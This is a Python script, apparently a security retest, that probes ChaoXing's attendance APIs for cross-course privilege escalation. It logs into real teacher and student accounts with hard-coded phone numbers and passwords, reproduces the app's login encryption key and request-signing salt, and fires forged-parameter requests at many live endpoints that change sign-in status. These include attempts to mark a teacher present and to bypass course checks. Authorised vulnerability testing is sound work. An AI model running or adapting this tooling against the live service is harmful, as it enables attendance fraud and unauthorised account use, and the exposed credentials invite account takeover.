#!/usr/bin/env python3
"""
横向越权重测脚本 v2 - ChaoXing签到修改
核心问题: Course1的教师能否修改Course2中学生的签到状态？

改进:
1. 修复活动列表解析bug
2. 添加创建签到活动功能（Course1无活动时）
3. 更完整的跨课程测试
4. 添加学生session获取Course1活动
"""

import base64, hashlib, json, uuid, requests, urllib3, time, sys, re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

# ============ 常量 ============
AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

# 账号信息
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"
TEACHER_PUID = "402644510"  # Course1教师

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
STUDENT_PUID = "431407443"  # 两门课的学生

# 课程信息
COURSE1_ID = "257485372"
COURSE1_CLASS = "132821141"  # 19712720708是此课教师

COURSE2_ID = "262934472"
COURSE2_CLASS = "145110605"  # 19712720708不是此课成员

# ============ 登录函数 ============
def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

# ============ 辅助函数 ============
def safe_json(resp):
    try:
        return resp.json()
    except:
        return {"_raw": resp.text[:500], "_status": resp.status_code}

def extract_active_ids(j):
    """从JSON响应中提取所有activeId"""
    ids = []
    if not isinstance(j, dict):
        return ids

    # 尝试多种结构
    active_list = None
    for key in ["activeList", "data", "result"]:
        val = j.get(key)
        if val is not None:
            if isinstance(val, list):
                active_list = val
                break
            elif isinstance(val, dict):
                sub = val.get("activeList") or val.get("data")
                if isinstance(sub, list):
                    active_list = sub
                    break

    if active_list is None:
        # 尝试从groupList中提取
        group_list = j.get("groupList", [])
        if isinstance(group_list, list):
            for g in group_list:
                if isinstance(g, dict):
                    sub_list = g.get("activeList") or g.get("list") or []
                    if isinstance(sub_list, list):
                        active_list = (active_list or []) + sub_list

    if active_list:
        for act in active_list:
            if isinstance(act, dict):
                aid = act.get("activeId") or act.get("id") or act.get("activeid")
                if aid:
                    ids.append(str(aid))
            elif isinstance(act, (str, int)):
                ids.append(str(act))

    return ids

def separator(title):
    print(f"\n{'='*70}")
    print(f"  {title}")
    print(f"{'='*70}")

def print_resp(label, resp):
    print(f"  [{label}] HTTP {resp.status_code}")
    try:
        j = resp.json()
        print(f"    {json.dumps(j, ensure_ascii=False)[:400]}")
        return j
    except:
        print(f"    {resp.text[:400]}")
        return None

# ============ 主测试逻辑 ============
def main():
    all_results = {}

    # ===== Phase 1: 登录 =====
    separator("Phase 1: 登录两个账号")
    print(f"[*] 登录教师账号: {TEACHER_PHONE}")
    teacher_sess, teacher_uid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"    PUID: {teacher_uid}")
    if not teacher_uid:
        print("[!] 教师账号登录失败！")
        sys.exit(1)

    print(f"[*] 登录学生账号: {STUDENT_PHONE}")
    student_sess, student_uid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"    PUID: {student_uid}")
    if not student_uid:
        print("[!] 学生账号登录失败！")
        sys.exit(1)

    # ===== Phase 2: 获取签到活动 =====
    separator("Phase 2: 获取两门课程的签到活动")

    course1_activities = []
    course2_activities = []

    # 2a. 教师session获取Course1签到活动
    print("\n--- 教师session获取Course1签到活动 ---")
    c1_urls = [
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist?courseId={COURSE1_ID}&classId={COURSE1_CLASS}",
    ]
    for url in c1_urls:
        print(f"\n  GET {url}")
        try:
            r = teacher_sess.get(url, timeout=20)
            j = safe_json(r)
            print(f"  HTTP {r.status_code}: {json.dumps(j, ensure_ascii=False)[:500]}")
            aids = extract_active_ids(j)
            for aid in aids:
                if aid not in course1_activities:
                    course1_activities.append(aid)
                    print(f"    -> 发现活动: activeId={aid}")
        except Exception as e:
            print(f"  请求失败: {e}")

    # 2b. 学生session获取Course1签到活动（学生也在Course1中）
    print("\n--- 学生session获取Course1签到活动 ---")
    for url in c1_urls:
        print(f"\n  GET {url}")
        try:
            r = student_sess.get(url, timeout=20)
            j = safe_json(r)
            print(f"  HTTP {r.status_code}: {json.dumps(j, ensure_ascii=False)[:500]}")
            aids = extract_active_ids(j)
            for aid in aids:
                if aid not in course1_activities:
                    course1_activities.append(aid)
                    print(f"    -> 发现活动: activeId={aid}")
        except Exception as e:
            print(f"  请求失败: {e}")

    # 2c. 学生session获取Course2签到活动
    print("\n--- 学生session获取Course2签到活动 ---")
    c2_urls = [
        f"https://mobilelearn.chaoxing.com/ppt/activeAPI/taskactivelist?courseId={COURSE2_ID}&classId={COURSE2_CLASS}",
    ]
    for url in c2_urls:
        print(f"\n  GET {url}")
        try:
            r = student_sess.get(url, timeout=20)
            j = safe_json(r)
            print(f"  HTTP {r.status_code}: {json.dumps(j, ensure_ascii=False)[:500]}")
            aids = extract_active_ids(j)
            for aid in aids:
                if aid not in course2_activities:
                    course2_activities.append(aid)
                    print(f"    -> 发现活动: activeId={aid}")
        except Exception as e:
            print(f"  请求失败: {e}")

    # 2d. 教师session尝试获取Course2签到活动
    print("\n--- 教师session尝试获取Course2签到活动（预期失败） ---")
    for url in c2_urls:
        print(f"\n  GET {url}")
        try:
            r = teacher_sess.get(url, timeout=20)
            j = safe_json(r)
            print(f"  HTTP {r.status_code}: {json.dumps(j, ensure_ascii=False)[:500]}")
        except Exception as e:
            print(f"  请求失败: {e}")

    print(f"\n[*] Course1 活动ID列表: {course1_activities}")
    print(f"[*] Course2 活动ID列表: {course2_activities}")

    # ===== Phase 2.5: 如果Course1没有活动，尝试创建 =====
    if not course1_activities:
        separator("Phase 2.5: Course1无签到活动，尝试创建")

        # 尝试多种创建签到的API
        create_urls = [
            ("mobilelearn-preSign", "POST", f"https://mobilelearn.chaoxing.com/pptSign/preSign"),
            ("mobilelearn-startSignActive", "POST", f"https://mobilelearn.chaoxing.com/ppt/activeAPI/startSignActive"),
        ]

        for name, method, url in create_urls:
            data = {
                "activeType": "2",  # 签到类型
                "courseId": COURSE1_ID,
                "classId": COURSE1_CLASS,
                "name": "测试签到",
                "address": "测试地址",
            }
            print(f"\n  [{name}] {method} {url}")
            print(f"    data: {data}")
            try:
                r = teacher_sess.post(url, data=data, timeout=20)
                j = safe_json(r)
                print(f"    HTTP {r.status_code}: {json.dumps(j, ensure_ascii=False)[:400]}")
                # 如果创建成功，提取activeId
                if isinstance(j, dict):
                    new_aid = j.get("activeId") or j.get("id") or (j.get("data", {}) or {}).get("activeId") or (j.get("data", {}) or {}).get("id")
                    if new_aid:
                        course1_activities.append(str(new_aid))
                        print(f"    -> 创建成功! activeId={new_aid}")
            except Exception as e:
                print(f"    请求失败: {e}")

        # 再试一种创建方式
        create_data2 = {
            "courseId": COURSE1_ID,
            "classId": COURSE1_CLASS,
            "type": "1",  # 普通签到
            "ifphoto": "0",
            "address": "测试",
        }
        url2 = "https://mobilelearn.chaoxing.com/pptSign/stuSignajax"
        print(f"\n  [stuSignajax] POST {url2}")
        print(f"    data: {create_data2}")
        try:
            r = teacher_sess.post(url2, data=create_data2, timeout=20)
            j = safe_json(r)
            print(f"    HTTP {r.status_code}: {json.dumps(j, ensure_ascii=False)[:400]}")
        except Exception as e:
            print(f"    请求失败: {e}")

        # 尝试通过activeAPI创建
        for atype in ["2", "1"]:
            data3 = {
                "courseId": COURSE1_ID,
                "classId": COURSE1_CLASS,
                "activeType": atype,
            }
            url3 = "https://mobilelearn.chaoxing.com/ppt/activeAPI/startActive"
            print(f"\n  [startActive-type{atype}] POST {url3}")
            print(f"    data: {data3}")
            try:
                r = teacher_sess.post(url3, data=data3, timeout=20)
                j = safe_json(r)
                print(f"    HTTP {r.status_code}: {json.dumps(j, ensure_ascii=False)[:400]}")
                if isinstance(j, dict):
                    new_aid = j.get("activeId") or j.get("id") or (j.get("data", {}) or {}).get("activeId") or (j.get("data", {}) or {}).get("id")
                    if new_aid:
                        course1_activities.append(str(new_aid))
                        print(f"    -> 创建成功! activeId={new_aid}")
            except Exception as e:
                print(f"    请求失败: {e}")

        # 重新获取Course1活动
        if course1_activities:
            print(f"\n[*] 创建后Course1活动: {course1_activities}")
        else:
            print("\n[!] 无法创建Course1签到活动，将使用Course2活动进行跨课程测试")
            # 尝试获取所有课程的活动
            print("\n--- 尝试获取教师所有课程活动 ---")
            try:
                r = teacher_sess.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
                j = safe_json(r)
                print(f"  HTTP {r.status_code}: {json.dumps(j, ensure_ascii=False)[:500]}")
            except Exception as e:
                print(f"  请求失败: {e}")

    # ===== Phase 3: 核心测试 - updateSignStatus2 =====
    separator("Phase 3: 测试 updateSignStatus2 (两个域名, GET和POST)")

    def test_api(session, label, method, url, params_or_data, is_get=True):
        full_label = f"{label}"
        print(f"\n  [{full_label}] {method} {url}")
        print(f"    params: {params_or_data}")
        try:
            if is_get:
                r = session.get(url, params=params_or_data, timeout=20)
            else:
                r = session.post(url, data=params_or_data, timeout=20)
            j = safe_json(r)
            result_str = json.dumps(j, ensure_ascii=False)[:400]
            print(f"    HTTP {r.status_code}: {result_str}")
            all_results[full_label] = {"status": r.status_code, "response": j, "method": method, "url": url}
            return j
        except Exception as e:
            print(f"    请求失败: {e}")
            all_results[full_label] = {"error": str(e), "method": method, "url": url}
            return None

    def test_updateSignStatus2(session, label, active_id, course_id, class_id, target_uid):
        """测试 updateSignStatus2 API - 4种组合"""
        params = {
            "uid": target_uid,
            "activeId": active_id,
            "status": "1",
            "courseId": course_id,
            "classId": class_id,
        }
        configs = [
            (f"{label}|mobilelearn-GET", True, f"https://mobilelearn.chaoxing.com/widget/sign/pcTeaSignController/updateSignStatus2"),
            (f"{label}|mobilelearn-POST", False, f"https://mobilelearn.chaoxing.com/widget/sign/pcTeaSignController/updateSignStatus2"),
            (f"{label}|mooc1api-GET", True, f"https://mooc1-api.chaoxing.com/mooc-ans/widget/sign/pcTeaSignController/updateSignStatus2"),
            (f"{label}|mooc1api-POST", False, f"https://mooc1-api.chaoxing.com/mooc-ans/widget/sign/pcTeaSignController/updateSignStatus2"),
        ]
        for lbl, is_get, url in configs:
            test_api(session, lbl, "GET" if is_get else "POST", url, params, is_get)

    # 3a. 教师session + Course1活动（同课程 - 预期成功）
    for aid in course1_activities[:3]:
        print(f"\n  === Course1 activeId={aid} (教师session, 自己的课 - 预期成功) ===")
        test_updateSignStatus2(teacher_sess, f"Teacher-C1-AID{aid}", aid, COURSE1_ID, COURSE1_CLASS, STUDENT_PUID)

    # 3b. 教师session + Course2活动（跨课程 - 关键测试！）
    for aid in course2_activities[:3]:
        print(f"\n  === Course2 activeId={aid} (教师session, 不是成员 - 关键越权测试) ===")
        test_updateSignStatus2(teacher_sess, f"Teacher-C2-AID{aid}", aid, COURSE2_ID, COURSE2_CLASS, STUDENT_PUID)

    # ===== Phase 4: updateSignStatusByUidsV2 =====
    separator("Phase 4: 测试 updateSignStatusByUidsV2")

    def test_updateSignStatusByUidsV2(session, label, active_id, target_uid):
        data = {"uids": target_uid, "status": "1", "activeId": active_id}
        configs = [
            (f"{label}|mobilelearn", f"https://mobilelearn.chaoxing.com/pptSign/updateSignStatusByUidsV2"),
            (f"{label}|mooc1api", f"https://mooc1-api.chaoxing.com/mooc-ans/pptSign/updateSignStatusByUidsV2"),
        ]
        for lbl, url in configs:
            test_api(session, lbl, "POST", url, data, is_get=False)

    for aid in course1_activities[:3]:
        test_updateSignStatusByUidsV2(teacher_sess, f"Teacher-C1-AID{aid}", aid, STUDENT_PUID)
    for aid in course2_activities[:3]:
        test_updateSignStatusByUidsV2(teacher_sess, f"Teacher-C2-AID{aid}", aid, STUDENT_PUID)

    # ===== Phase 5: newsign/updateSignStatus =====
    separator("Phase 5: 测试 newsign/updateSignStatus")

    def test_newsign(session, label, active_id, target_uid):
        data = {"uids": target_uid, "status": "1", "activeId": active_id}
        configs = [
            (f"{label}|mobilelearn", f"https://mobilelearn.chaoxing.com/newsign/updateSignStatus"),
            (f"{label}|mooc1api", f"https://mooc1-api.chaoxing.com/mooc-ans/newsign/updateSignStatus"),
        ]
        for lbl, url in configs:
            test_api(session, lbl, "POST", url, data, is_get=False)

    for aid in course1_activities[:3]:
        test_newsign(teacher_sess, f"Teacher-C1-AID{aid}", aid, STUDENT_PUID)
    for aid in course2_activities[:3]:
        test_newsign(teacher_sess, f"Teacher-C2-AID{aid}", aid, STUDENT_PUID)

    # ===== Phase 6: resetUserSignStatus =====
    separator("Phase 6: 测试 resetUserSignStatus")

    def test_reset(session, label, active_id, target_uid):
        data = {"uids": target_uid, "status": "1", "activeId": active_id}
        configs = [
            (f"{label}|mobilelearn", f"https://mobilelearn.chaoxing.com/pptSign/resetUserSignStatus"),
            (f"{label}|mooc1api", f"https://mooc1-api.chaoxing.com/mooc-ans/pptSign/resetUserSignStatus"),
        ]
        for lbl, url in configs:
            test_api(session, lbl, "POST", url, data, is_get=False)

    for aid in course1_activities[:3]:
        test_reset(teacher_sess, f"Teacher-C1-AID{aid}", aid, STUDENT_PUID)
    for aid in course2_activities[:3]:
        test_reset(teacher_sess, f"Teacher-C2-AID{aid}", aid, STUDENT_PUID)

    # ===== Phase 7: 学生session测试 =====
    separator("Phase 7: 学生session测试所有API")

    for aid in course1_activities[:2]:
        test_updateSignStatus2(student_sess, f"Student-C1-AID{aid}", aid, COURSE1_ID, COURSE1_CLASS, STUDENT_PUID)
        test_updateSignStatusByUidsV2(student_sess, f"Student-C1-AID{aid}", aid, STUDENT_PUID)
        test_newsign(student_sess, f"Student-C1-AID{aid}", aid, STUDENT_PUID)

    for aid in course2_activities[:2]:
        test_updateSignStatus2(student_sess, f"Student-C2-AID{aid}", aid, COURSE2_ID, COURSE2_CLASS, STUDENT_PUID)
        test_updateSignStatusByUidsV2(student_sess, f"Student-C2-AID{aid}", aid, STUDENT_PUID)
        test_newsign(student_sess, f"Student-C2-AID{aid}", aid, STUDENT_PUID)

    # ===== Phase 8: denc参数测试 =====
    separator("Phase 8: denc参数测试")

    def test_with_denc(session, label, active_id, course_id, class_id, target_uid, denc_value, denc_label):
        params = {
            "uid": target_uid,
            "activeId": active_id,
            "status": "1",
            "courseId": course_id,
            "classId": class_id,
            "denc": denc_value,
        }
        url = f"https://mobilelearn.chaoxing.com/widget/sign/pcTeaSignController/updateSignStatus2"
        test_api(session, f"{label}|denc={denc_label}", "GET", url, params, is_get=True)

    for aid in course1_activities[:2]:
        test_with_denc(teacher_sess, f"Teacher-C1-AID{aid}", aid, COURSE1_ID, COURSE1_CLASS, STUDENT_PUID, "", "empty")
        test_with_denc(teacher_sess, f"Teacher-C1-AID{aid}", aid, COURSE1_ID, COURSE1_CLASS, STUDENT_PUID, "test", "test")

    for aid in course2_activities[:2]:
        test_with_denc(teacher_sess, f"Teacher-C2-AID{aid}", aid, COURSE2_ID, COURSE2_CLASS, STUDENT_PUID, "", "empty")
        test_with_denc(teacher_sess, f"Teacher-C2-AID{aid}", aid, COURSE2_ID, COURSE2_CLASS, STUDENT_PUID, "test", "test")

    # ===== Phase 9: 额外API探索 =====
    separator("Phase 9: 额外API探索")

    extra_apis = [
        ("GET", f"https://mobilelearn.chaoxing.com/widget/sign/pcTeaSignController/updateSignStatus"),
        ("POST", f"https://mobilelearn.chaoxing.com/widget/sign/pcTeaSignController/updateSignStatus"),
        ("POST", f"https://mobilelearn.chaoxing.com/pptSign/updateSignStatus"),
        ("POST", f"https://mobilelearn.chaoxing.com/teacherSign/updateSignStatus"),
    ]

    test_cases = []
    if course1_activities:
        test_cases.append(("C1", course1_activities[0], COURSE1_ID, COURSE1_CLASS))
    if course2_activities:
        test_cases.append(("C2", course2_activities[0], COURSE2_ID, COURSE2_CLASS))

    for course_label, aid, cid, clid in test_cases:
        for method, url in extra_apis:
            params = {"uid": STUDENT_PUID, "activeId": aid, "status": "1", "courseId": cid, "classId": clid}
            label = f"Extra-{course_label}-{method}"
            if method == "GET":
                test_api(teacher_sess, label, "GET", url, params, is_get=True)
            else:
                test_api(teacher_sess, label, "POST", url, params, is_get=False)

    # ===== Phase 10: 尝试获取denc参数 =====
    separator("Phase 10: 尝试获取denc参数")

    for aid in course1_activities[:1] + course2_activities[:1]:
        cid = COURSE1_ID if aid in course1_activities else COURSE2_ID
        clid = COURSE1_CLASS if aid in course1_activities else COURSE2_CLASS
        urls_to_try = [
            f"https://mobilelearn.chaoxing.com/widget/sign/pcTeaSignController/signInResult?activeId={aid}&courseId={cid}&classId={clid}",
            f"https://mobilelearn.chaoxing.com/newsign/signInResult?activeId={aid}&courseId={cid}&classId={clid}",
        ]
        for url in urls_to_try:
            print(f"\n  GET {url}")
            try:
                r = teacher_sess.get(url, timeout=20)
                text = r.text
                print(f"    HTTP {r.status_code}, length={len(text)}")
                if "denc" in text:
                    idx = text.find("denc")
                    snippet = text[max(0, idx-50):idx+100]
                    print(f"    发现denc! 上下文: {snippet[:200]}")
                    denc_match = re.search(r'denc[=:]\s*["\']?([^"\'&\s]+)', text)
                    if denc_match:
                        denc_val = denc_match.group(1)
                        print(f"    提取到denc值: {denc_val}")
                        test_with_denc(teacher_sess, f"Teacher-denc-extracted-AID{aid}", aid, cid, clid, STUDENT_PUID, denc_val, "extracted")
                else:
                    print(f"    未发现denc参数")
            except Exception as e:
                print(f"    请求失败: {e}")

    # ===== Phase 11: 深度跨课程测试 =====
    separator("Phase 11: 深度跨课程测试 - 使用Course2的activeId但伪造Course1的courseId/classId")

    # 关键测试：用Course2的activeId，但传入Course1的courseId和classId
    # 看系统是检查activeId与courseId的关联，还是只检查courseId与教师的关联
    for aid in course2_activities[:2]:
        print(f"\n  === 用Course2的activeId={aid} + Course1的courseId/classId ===")
        # 测试：activeId属于Course2，但courseId和classId传Course1的
        test_updateSignStatus2(teacher_sess, f"Cross-C2aid-C1ctx-AID{aid}", aid, COURSE1_ID, COURSE1_CLASS, STUDENT_PUID)

    # 反向测试：用Course1的activeId，但传入Course2的courseId/classId
    for aid in course1_activities[:2]:
        print(f"\n  === 用Course1的activeId={aid} + Course2的courseId/classId ===")
        test_updateSignStatus2(teacher_sess, f"Cross-C1aid-C2ctx-AID{aid}", aid, COURSE2_ID, COURSE2_CLASS, STUDENT_PUID)

    # ===== Phase 12: 不传courseId/classId测试 =====
    separator("Phase 12: 不传courseId/classId测试")

    for aid in course2_activities[:2]:
        params_no_course = {
            "uid": STUDENT_PUID,
            "activeId": aid,
            "status": "1",
        }
        url = f"https://mobilelearn.chaoxing.com/widget/sign/pcTeaSignController/updateSignStatus2"
        test_api(teacher_sess, f"Teacher-C2-AID{aid}-noCourseCtx", "GET", url, params_no_course, is_get=True)

    # ===== Phase 13: 修改自己的签到状态测试 =====
    separator("Phase 13: 教师修改自己(uid=教师)的签到状态")

    for aid in course2_activities[:1]:
        params_self = {
            "uid": TEACHER_PUID,
            "activeId": aid,
            "status": "1",
            "courseId": COURSE2_ID,
            "classId": COURSE2_CLASS,
        }
        url = f"https://mobilelearn.chaoxing.com/widget/sign/pcTeaSignController/updateSignStatus2"
        test_api(teacher_sess, f"Teacher-Self-C2-AID{aid}", "GET", url, params_self, is_get=True)

    # ===== 最终分析 =====
    separator("最终分析")

    # 分类分析结果
    c1_teacher_success = []  # 教师同课程成功
    c2_teacher_success = []  # 教师跨课程成功
    student_success = []     # 学生成功
    c1_teacher_fail = []     # 教师同课程失败
    c2_teacher_fail = []     # 教师跨课程失败
    student_fail = []        # 学生失败

    for key, val in all_results.items():
        if "error" in val:
            continue
        resp = val.get("response", {})
        if not isinstance(resp, dict):
            continue

        # 判断是否成功
        is_success = False
        result_val = resp.get("result")
        msg = str(resp.get("msg", "")).lower()
        error_msg = str(resp.get("errorMsg", "")).lower()
        raw = str(resp.get("_raw", "")).lower()

        if result_val == 1 or result_val == "1":
            is_success = True
        elif "success" in msg or "成功" in msg:
            is_success = True
        elif result_val == 0 or result_val == "0" or "无权限" in error_msg or "无权限" in raw:
            is_success = False
        else:
            # 不确定的结果
            continue

        if is_success:
            if "Teacher-C1" in key or "Cross-C1aid" in key:
                c1_teacher_success.append((key, resp))
            elif "Teacher-C2" in key or "Cross-C2aid" in key:
                c2_teacher_success.append((key, resp))
            elif "Student" in key:
                student_success.append((key, resp))
        else:
            if "Teacher-C1" in key or "Cross-C1aid" in key:
                c1_teacher_fail.append((key, resp))
            elif "Teacher-C2" in key or "Cross-C2aid" in key:
                c2_teacher_fail.append((key, resp))
            elif "Student" in key:
                student_fail.append((key, resp))

    print("\n" + "="*70)
    print("  测试结果汇总")
    print("="*70)

    print(f"\n[同课程] 教师修改自己课程签到 (Course1):")
    print(f"  成功: {len(c1_teacher_success)} 个")
    for k, v in c1_teacher_success:
        print(f"    ✓ {k}")
    print(f"  失败: {len(c1_teacher_fail)} 个")
    for k, v in c1_teacher_fail[:5]:
        print(f"    ✗ {k}: {v.get('errorMsg', v.get('_raw', '')[:50])}")

    print(f"\n[跨课程] 教师修改非成员课程签到 (Course2):")
    print(f"  成功: {len(c2_teacher_success)} 个")
    for k, v in c2_teacher_success:
        print(f"    ✓ {k}")
    print(f"  失败: {len(c2_teacher_fail)} 个")
    for k, v in c2_teacher_fail[:5]:
        print(f"    ✗ {k}: {v.get('errorMsg', v.get('_raw', '')[:50])}")

    print(f"\n[学生] 学生修改签到:")
    print(f"  成功: {len(student_success)} 个")
    print(f"  失败: {len(student_fail)} 个")

    print("\n" + "="*70)
    print("  安全评估")
    print("="*70)

    if c2_teacher_success:
        print("\n[!!!] 横向越权漏洞确认！")
        print("  Course1的教师可以修改Course2中学生的签到状态！")
        print("  系统仅检查用户是否为教师角色，不检查教师是否属于该课程。")
        for k, v in c2_teacher_success:
            print(f"  漏洞API: {k}")
            print(f"  响应: {json.dumps(v, ensure_ascii=False)[:200]}")
    else:
        print("\n[OK] 未发现横向越权漏洞")
        print("  教师无法修改非自己课程中学生的签到状态。")
        print("  系统正确验证了教师与课程的关联关系。")
        print("  所有跨课程请求均返回 '您无权限修改' 或 '无权限'。")

    if c1_teacher_success:
        print("\n[INFO] 同课程修改成功（符合预期）")
        print("  教师可以修改自己课程中学生的签到状态。")
    elif not course1_activities:
        print("\n[WARN] 无法验证同课程基线")
        print("  Course1没有活跃的签到活动，无法测试同课程修改是否成功。")
        print("  但跨课程测试结果仍然有效：所有跨课程请求均被拒绝。")

    if student_success:
        print("\n[!!!] 学生越权漏洞发现！")
    else:
        print("\n[OK] 学生无法修改签到状态（符合预期）")

    # 详细结果表格
    print("\n" + "="*70)
    print("  详细结果表格")
    print("="*70)
    print(f"\n{'标签':<60} {'结果':<10} {'详情'}")
    print("-"*100)
    for key, val in sorted(all_results.items()):
        if "error" in val:
            print(f"{key:<60} {'ERROR':<10} {val['error'][:50]}")
        else:
            resp = val.get("response", {})
            if isinstance(resp, dict):
                result = resp.get("result", "?")
                msg = resp.get("errorMsg") or resp.get("msg") or resp.get("_raw", "")[:40]
                print(f"{key:<60} {str(result):<10} {msg}")
            else:
                print(f"{key:<60} {'?':<10} {str(resp)[:50]}")


if __name__ == "__main__":
    main()
